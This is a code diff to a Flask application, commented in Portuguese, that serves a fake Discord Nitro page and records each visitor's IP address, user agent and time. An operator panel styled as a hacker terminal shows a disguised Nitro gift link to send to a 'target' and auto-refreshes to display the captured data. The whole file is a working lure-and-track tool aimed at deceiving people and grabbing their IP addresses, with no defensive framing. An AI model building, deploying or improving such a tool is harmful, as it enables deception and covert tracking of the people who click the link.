@@ -5,24 +5,22 @@ from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
-LOGS_FILE = "logs.json"
+LOGS_FILE = "latest_log.json"
 
-def carregar_logs():
+def carregar_ultimo_log():
     if os.path.exists(LOGS_FILE):
         try:
             with open(LOGS_FILE, "r", encoding="utf-8") as f:
                 return json.load(f)
         except Exception:
-            return []
-    return []
+            return None
+    return None
 
-def salvar_log(dados):
-    logs = carregar_logs()
-    logs.insert(0, dados)
+def salvar_ultimo_log(dados):
     with open(LOGS_FILE, "w", encoding="utf-8") as f:
-        json.dump(logs, f, ensure_ascii=False, indent=2)
+        json.dump(dados, f, ensure_ascii=False, indent=2)
 
-# Template HTML da página falsa do Discord (Nitro Expirado)
+# Template HTML da página falsa do Discord
 DISCORD_NITRO_HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -99,121 +97,168 @@ DISCORD_NITRO_HTML = """
 </html>
 """
 
-# Template HTML do Painel Hacker Estilizado
+# Template HTML do Painel Anônimo com Blur, Radar Satélite e Torre de Sinal Piscando
 PANEL_HTML = """
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CYBER_LOG // Terminal Interface</title>
+    <title>GLOBAL_INTERCEPT // SECURE TERMINAL</title>
     <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <style>
         * { box-sizing: border-box; }
         body {
-            background-color: #050505;
+            background-color: #020502;
             color: #00ff66;
             font-family: 'Share Tech Mono', monospace;
             margin: 0;
             padding: 20px;
             overflow-x: hidden;
+            height: 100vh;
         }
-        /* Efeito de scanline (linhas de monitor antigo) */
+
+        /* Fundo com efeito de Radar / Satélite Global Global */
+        .bg-radar {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at center, rgba(0, 20, 10, 0.8) 0%, rgba(2, 5, 2, 0.95) 100%);
+            z-index: -2;
+        }
+
+        /* Efeito de Blur Cibernético e Scanlines */
         body::before {
             content: " ";
             display: block;
             position: fixed;
             top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.3) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
             z-index: 99999;
             background-size: 100% 4px, 6px 100%;
             pointer-events: none;
         }
-        .container { max-width: 1100px; margin: 0 auto; }
+
+        .container { 
+            max-width: 900px; 
+            margin: 0 auto; 
+            background: rgba(5, 12, 8, 0.75);
+            backdrop-filter: blur(8px);
+            border: 1px solid rgba(0, 255, 102, 0.3);
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 30px rgba(0, 255, 102, 0.1);
+        }
+
         header {
-            border-bottom: 2px dashed #00ff66;
+            border-bottom: 1px solid rgba(0, 255, 102, 0.4);
             padding-bottom: 15px;
             margin-bottom: 25px;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
-        h1 { margin: 0; font-size: 26px; text-shadow: 0 0 10px rgba(0,255,102,0.6); }
-        .status-online { color: #00ff66; font-size: 14px; animation: blink 1.5s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        h1 { margin: 0; font-size: 22px; text-shadow: 0 0 8px rgba(0,255,102,0.5); letter-spacing: 2px; }
+
+        /* Torre de Sinal Piscando (Estilo Alerta Satélite) */
+        .signal-tower {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #ff0055;
+            font-weight: bold;
+            background: rgba(255, 0, 85, 0.1);
+            padding: 6px 12px;
+            border: 1px solid rgba(255, 0, 85, 0.4);
+            border-radius: 4px;
+        }
+        .tower-light {
+            width: 10px;
+            height: 10px;
+            background-color: #ff0055;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #ff0055;
+            animation: pulse-tower 1s infinite alternate;
+        }
+        @keyframes pulse-tower {
+            0% { opacity: 0.2; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1.2); box-shadow: 0 0 15px #ff0055; }
+        }
 
         .card {
-            background: rgba(0, 20, 10, 0.4);
-            border: 1px solid #00ff66;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid #004411;
             padding: 20px;
             border-radius: 4px;
-            margin-bottom: 25px;
-            box-shadow: 0 0 15px rgba(0, 255, 102, 0.15);
+            margin-bottom: 20px;
         }
-        h3 { margin-top: 0; color: #fff; border-left: 4px solid #00ff66; padding-left: 10px; }
+        h3 { margin-top: 0; color: #fff; font-size: 15px; letter-spacing: 1px; border-left: 3px solid #00ff66; padding-left: 10px; }
+        
         .link-box {
             background: #000;
             border: 1px dashed #00ff66;
             padding: 12px;
-            font-size: 16px;
+            font-size: 15px;
             color: #00ff66;
             word-break: break-all;
             letter-spacing: 1px;
         }
-        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
-        th, td { border: 1px solid #004411; padding: 12px; text-align: left; font-size: 14px; }
-        th { background: #002208; color: #00ff66; text-transform: uppercase; letter-spacing: 1px; }
-        tr:hover { background: rgba(0, 255, 102, 0.05); }
-        .ip-highlight { color: #ff0055; font-weight: bold; text-shadow: 0 0 5px rgba(255,0,85,0.4); }
-        .footer { text-align: center; font-size: 12px; color: #008833; margin-top: 40px; }
+
+        .target-box {
+            background: #000;
+            border: 1px solid #ff0055;
+            padding: 20px;
+            position: relative;
+            box-shadow: inset 0 0 15px rgba(255,0,85,0.1);
+        }
+        .target-item { margin-bottom: 12px; font-size: 15px; }
+        .ip-highlight { color: #ff0055; font-weight: bold; text-shadow: 0 0 6px rgba(255,0,85,0.6); font-size: 22px; }
+        
+        .footer { text-align: center; font-size: 11px; color: #006622; margin-top: 30px; letter-spacing: 2px; }
     </style>
 </head>
 <body>
+    <div class="bg-radar"></div>
     <div class="container">
         <header>
-            <h1>[SYS_ROOT] // IP_LOGGER_MATRIX</h1>
-            <div class="status-online">● STATUS: SECURE / LISTENING</div>
+            <h1>[ANON_SYS] // GLOBAL_RADAR</h1>
+            <div class="signal-tower">
+                <div class="tower-light"></div>
+                SATELLITE LINK: ACTIVE
+            </div>
         </header>
 
         <div class="card">
-            <h3>ACTIVE_TRACKING_URL</h3>
+            <h3>TARGET_DISPATCH_URL</h3>
             <div class="link-box" id="track-link">INITIALIZING...</div>
-            <p style="font-size: 13px; color: #88cc99; margin-top: 10px;">> Envie este link camuflado para o alvo. Os dados serão interceptados em tempo real.</p>
         </div>
         
         <div class="card">
-            <h3>INTERCEPTED_TARGETS (LOGS)</h3>
-            <table>
-                <thead>
-                    <tr>
-                        <th>TIMESTAMP</th>
-                        <th>TARGET_IP</th>
-                        <th>USER_AGENT / DEVICE INFO</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    {% for log in logs %}
-                    <tr>
-                        <td>{{ log.data }}</td>
-                        <td class="ip-highlight">{{ log.ip }}</td>
-                        <td>{{ log.user_agent }}</td>
-                    </tr>
-                    {% else %}
-                    <tr>
-                        <td colspan="3" style="text-align:center; color: #446655;">[ NENHUM SINAL CAPTURADO AINDA ]</td>
-                    </tr>
-                    {% endfor %}
-                </tbody>
-            </table>
+            <h3>INTERCEPTED_TARGET_DATA</h3>
+            <div class="target-box">
+                {% if log %}
+                    <div class="target-item"><strong>TIMESTAMP:</strong> {{ log.data }}</div>
+                    <div class="target-item"><strong>TARGET_IP:</strong> <span class="ip-highlight">{{ log.ip }}</span></div>
+                    <div class="target-item"><strong>DEVICE_AGENT:</strong> {{ log.user_agent }}</div>
+                {% else %}
+                    <div style="color: #446655; text-align: center; padding: 15px;">[ AGUARDANDO SINAL DO ALVO... ]</div>
+                {% endif %}
+            </div>
         </div>
 
         <div class="footer">
-            SECURE ACCESS TERMINAL // ENCRYPTION: AES-256
+            ENCRYPTION: SHIELD-X // PROTOCOL: STEALTH_ON
         </div>
     </div>
 
     <script>
-        document.getElementById('track-link').innerText = window.location.origin + '/nitro/nitro_boost_xyz99';
+        document.getElementById('track-link').innerText = 'https://sl1nk.com/discord-nitro-gift-7x9kl5t';
+        
+        // Atualiza a cada 3 segundos automaticamente para capturar o alvo em tempo real
+        setTimeout(function(){
+            window.location.reload();
+        }, 3000);
     </script>
 </body>
 </html>
@@ -228,7 +273,7 @@ def nitro_fake(subpath):
     user_agent = request.headers.get('User-Agent', 'Desconhecido')
     data_hora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-    salvar_log({
+    salvar_ultimo_log({
         "ip": ip,
         "user_agent": user_agent,
         "data": data_hora
@@ -238,8 +283,8 @@ def nitro_fake(subpath):
 
 @app.route('/painel')
 def painel():
-    logs = carregar_logs()
-    return render_template_string(PANEL_HTML, logs=logs)
+    log = carregar_ultimo_log()
+    return render_template_string(PANEL_HTML, log=log)
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
